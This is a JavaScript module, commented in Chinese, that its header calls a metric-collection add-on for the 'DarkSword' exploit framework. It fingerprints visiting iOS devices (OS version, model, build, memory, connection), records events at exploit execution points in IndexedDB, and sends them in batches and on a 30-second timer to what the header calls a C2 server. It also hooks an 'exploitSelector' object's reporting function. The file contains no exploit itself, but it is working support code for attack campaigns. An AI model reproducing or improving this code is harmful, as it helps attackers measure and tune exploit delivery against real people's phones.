/**
 * DarkSword A/B 测试框架 - Metric 收集增强
 * 
 * 功能:
 * - 在关键 exploit 执行点埋入 metric 收集
 * - 持久化 metrics 到 IndexedDB（离线支持）
 * - 批量发送到 C2 服务器
 * - 提供实时性能监控和成功率分析
 */

class MetricCollector {
  constructor() {
    this.endpoint = '/metric';
    this.batchEndpoint = '/metric/batch';
    this.sessionId = this.generateSessionId();
    this.buffer = [];
    this.bufferSize = 10;
    this.dbName = 'darksword_metrics';
    this.dbVersion = 1;
    this.db = null;
    
    this.initDB();
    console.log('[MetricCollector] Initialized with session:', this.sessionId);
  }
  
  /**
   * 生成会话 ID
   */
  generateSessionId() {
    return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }
  
  /**
   * 初始化 IndexedDB
   */
  initDB() {
    if (typeof indexedDB === 'undefined') {
      console.warn('[MetricCollector] IndexedDB not available');
      return;
    }
    
    const request = indexedDB.open(this.dbName, this.dbVersion);
    
    request.onerror = () => {
      console.error('[MetricCollector] DB error:', request.error);
    };
    
    request.onsuccess = () => {
      this.db = request.result;
      console.log('[MetricCollector] DB initialized');
      
      // 启动后台同步
      this.startBackgroundSync();
    };
    
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      
      // 创建 metrics 存储
      if (!db.objectStoreNames.contains('metrics')) {
        const store = db.createObjectStore('metrics', { keyPath: 'id', autoIncrement: true });
        store.createIndex('timestamp', 'timestamp', { unique: false });
        store.createIndex('event', 'event', { unique: false });
        store.createIndex('synced', 'synced', { unique: false });
      }
    };
  }
  
  /**
   * 收集 metric
   * @param {string} event - 事件类型
   * @param {Object} data - 事件数据
   * @param {Object} context - 可选上下文覆盖
   */
  collect(event, data, context = null) {
    const metric = {
      sessionId: this.sessionId,
      timestamp: Date.now(),
      event,
      context: context || this.getContext(),
      data: {
        ...data,
        memoryPressure: this.getMemoryPressure(),
        performanceTiming: this.getPerformanceTiming()
      },
      synced: false
    };
    
    // 添加到缓冲区
    this.buffer.push(metric);
    
    // 保存到 IndexedDB
    this.saveToDB(metric);
    
    // 检查是否需要批量发送
    if (this.buffer.length >= this.bufferSize) {
      this.flush();
    }
  }
  
  /**
   * 获取当前上下文
   */
  getContext() {
    const ua = navigator.userAgent;
    const iosMatch = /iPhone OS ([0-9_]+)/g.exec(ua) || /CPU OS ([0-9_]+)/g.exec(ua);
    const iosVersion = iosMatch ? iosMatch[1].replace(/_/g, '.') : 'unknown';
    
    const deviceMatch = /iPhone\d+,\d+|iPad\d+,\d+/.exec(ua);
    const device = deviceMatch ? deviceMatch[0] : 'unknown';
    
    return {
      iosVersion,
      device,
      build: typeof IOS_BUILD_ID !== 'undefined' ? IOS_BUILD_ID : 'unknown',
      capabilities: {
        wifi: this.detectWiFi(),
        bt: this.detectBluetooth()
      },
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio || 1
    };
  }
  
  /**
   * 获取内存压力信息
   */
  getMemoryPressure() {
    if (typeof performance !== 'undefined' && performance.memory) {
      return {
        usedJSHeapSize: performance.memory.usedJSHeapSize,
        totalJSHeapSize: performance.memory.totalJSHeapSize,
        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
        usedMB: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024),
        percentage: Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100)
      };
    }
    return null;
  }
  
  /**
   * 获取性能计时信息
   */
  getPerformanceTiming() {
    if (typeof performance !== 'undefined' && performance.timing) {
      const t = performance.timing;
      return {
        domContentLoaded: t.domContentLoadedEventEnd - t.navigationStart,
        loadComplete: t.loadEventEnd - t.navigationStart,
        domInteractive: t.domInteractive - t.navigationStart
      };
    }
    return null;
  }
  
  /**
   * 检测 WiFi
   */
  detectWiFi() {
    if (navigator.connection) {
      const type = navigator.connection.effectiveType || navigator.connection.type;
      return type === 'wifi' || type === '4g' || type === '5g';
    }
    return true;
  }
  
  /**
   * 检测蓝牙
   */
  detectBluetooth() {
    return typeof navigator.bluetooth !== 'undefined';
  }
  
  /**
   * 保存 metric 到 IndexedDB
   */
  saveToDB(metric) {
    if (!this.db) return;
    
    try {
      const transaction = this.db.transaction(['metrics'], 'readwrite');
      const store = transaction.objectStore('metrics');
      store.add(metric);
    } catch(e) {
      console.error('[MetricCollector] Failed to save to DB:', e);
    }
  }
  
  /**
   * 立即发送所有缓冲的 metrics
   */
  async flush() {
    if (this.buffer.length === 0) return;
    
    const batch = this.buffer.splice(0, this.buffer.length);
    
    console.log(`[MetricCollector] Flushing ${batch.length} metrics`);
    
    // 尝试使用 sendBeacon (优先)
    if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
      const payload = JSON.stringify({ metrics: batch });
      const sent = navigator.sendBeacon(this.batchEndpoint, payload);
      
      if (sent) {
        console.log('[MetricCollector] Sent via sendBeacon');
        this.markAsSynced(batch);
        return;
      }
    }
    
    // Fallback: 使用 XHR
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', this.batchEndpoint, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = () => {
        if (xhr.status === 200) {
          console.log('[MetricCollector] Sent via XHR');
          this.markAsSynced(batch);
        } else {
          console.warn('[MetricCollector] XHR failed:', xhr.status);
        }
      };
      
      xhr.onerror = () => {
        console.error('[MetricCollector] XHR error');
      };
      
      xhr.send(JSON.stringify({ metrics: batch }));
    } catch(e) {
      console.error('[MetricCollector] Failed to send:', e);
    }
  }
  
  /**
   * 标记 metrics 为已同步
   */
  markAsSynced(batch) {
    if (!this.db) return;
    
    try {
      const transaction = this.db.transaction(['metrics'], 'readwrite');
      const store = transaction.objectStore('metrics');
      
      batch.forEach(metric => {
        const request = store.openCursor();
        request.onsuccess = (event) => {
          const cursor = event.target.result;
          if (cursor) {
            if (cursor.value.timestamp === metric.timestamp && 
                cursor.value.sessionId === metric.sessionId) {
              const updateData = cursor.value;
              updateData.synced = true;
              cursor.update(updateData);
            }
            cursor.continue();
          }
        };
      });
    } catch(e) {
      console.error('[MetricCollector] Failed to mark as synced:', e);
    }
  }
  
  /**
   * 启动后台同步（定期尝试发送未同步的 metrics）
   */
  startBackgroundSync() {
    setInterval(() => {
      this.syncPendingMetrics();
    }, 30000); // 每 30 秒
  }
  
  /**
   * 同步待发送的 metrics
   */
  async syncPendingMetrics() {
    if (!this.db) return;
    
    try {
      const transaction = this.db.transaction(['metrics'], 'readonly');
      const store = transaction.objectStore('metrics');
      const index = store.index('synced');
      const request = index.getAll(false); // 获取所有未同步的
      
      request.onsuccess = () => {
        const pending = request.result;
        if (pending.length > 0) {
          console.log(`[MetricCollector] Syncing ${pending.length} pending metrics`);
          
          // 批量发送
          const xhr = new XMLHttpRequest();
          xhr.open('POST', this.batchEndpoint, true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          
          xhr.onload = () => {
            if (xhr.status === 200) {
              this.markAsSynced(pending);
            }
          };
          
          xhr.send(JSON.stringify({ metrics: pending }));
        }
      };
    } catch(e) {
      console.error('[MetricCollector] Failed to sync pending:', e);
    }
  }
  
  /**
   * 获取统计数据
   */
  async getStats() {
    if (!this.db) return null;
    
    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction(['metrics'], 'readonly');
      const store = transaction.objectStore('metrics');
      const request = store.getAll();
      
      request.onsuccess = () => {
        const metrics = request.result;
        
        const stats = {
          total: metrics.length,
          synced: metrics.filter(m => m.synced).length,
          byEvent: {},
          recentErrors: []
        };
        
        metrics.forEach(m => {
          if (!stats.byEvent[m.event]) {
            stats.byEvent[m.event] = 0;
          }
          stats.byEvent[m.event]++;
          
          // 收集最近的错误
          if (m.data && m.data.error) {
            stats.recentErrors.push({
              event: m.event,
              error: m.data.error,
              timestamp: m.timestamp
            });
          }
        });
        
        // 只保留最近 10 个错误
        stats.recentErrors = stats.recentErrors.slice(-10);
        
        resolve(stats);
      };
      
      request.onerror = () => {
        reject(request.error);
      };
    });
  }
  
  /**
   * 清空所有 metrics
   */
  async clearAll() {
    if (!this.db) return;
    
    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction(['metrics'], 'readwrite');
      const store = transaction.objectStore('metrics');
      const request = store.clear();
      
      request.onsuccess = () => {
        console.log('[MetricCollector] All metrics cleared');
        resolve();
      };
      
      request.onerror = () => {
        reject(request.error);
      };
    });
  }
}

// 全局实例
if (typeof window !== 'undefined') {
  window.MetricCollector = MetricCollector;
  window.metricCollector = new MetricCollector();
  
  // 为 ExploitSelector 提供 metric 收集接口
  if (window.exploitSelector) {
    const originalSendMetric = window.exploitSelector.sendMetric.bind(window.exploitSelector);
    window.exploitSelector.sendMetric = function(event, data) {
      // 同时使用两种方式收集
      originalSendMetric(event, data);
      window.metricCollector.collect(event, data);
    };
  }
  
  console.log('[MetricCollector] Global instance created at window.metricCollector');
}

console.log('[MetricCollector] Module loaded');